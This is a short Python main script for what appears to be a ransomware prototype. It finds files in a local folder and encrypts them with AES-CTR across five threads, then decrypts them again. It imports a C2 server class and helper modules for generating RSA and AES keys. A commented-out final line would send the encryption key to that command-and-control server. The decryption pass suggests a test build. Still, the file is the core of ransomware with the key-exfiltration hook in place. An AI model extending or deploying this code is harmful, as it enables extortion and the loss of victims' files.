# Import packages
import time
import pyaes
import queue
import threading

# Import Classes
from crypto.main import CryptClass
from server.main import C2Server
from utils.filefinder import FileFinder
from utils.RSAGenerator import RSAGen
from utils.AESGenerator import AESGenerator

if __name__ == "__main__":

    # Classes
    aesgen = AESGenerator()
    cryptclass = CryptClass(aesgen.aes_key_generator().encode())
    c2server = C2Server()
    filefinder = FileFinder()

    filefinder.filepaths("./files")

    q_encrypt = queue.Queue()

    for i in range(5):
        aes = pyaes.AESModeOfOperationCTR(cryptclass.key)
        thread_task_enc = threading.Thread(target=cryptclass.encrypt, args=(aes, q_encrypt, ), daemon=True)
        thread_task_enc.start()

    for f in filefinder.file_paths:
        q_encrypt.put(f)

    q_encrypt.join()

    time.sleep(5)
    print("-"*15)

    q_decrypt = queue.Queue()

    for i in range(5):
        aes = pyaes.AESModeOfOperationCTR(cryptclass.key)
        thread_task_dec = threading.Thread(target=cryptclass.decrypt, args=(aes, q_decrypt, ), daemon=True)
        thread_task_dec.start()

    for f in filefinder.file_paths:
        q_decrypt.put(f)
    
    q_decrypt.join()

    # Encrypt AES Key with Public RSA Key and send to C2 Server
    #c2server.send_machine(cryptclass.key)
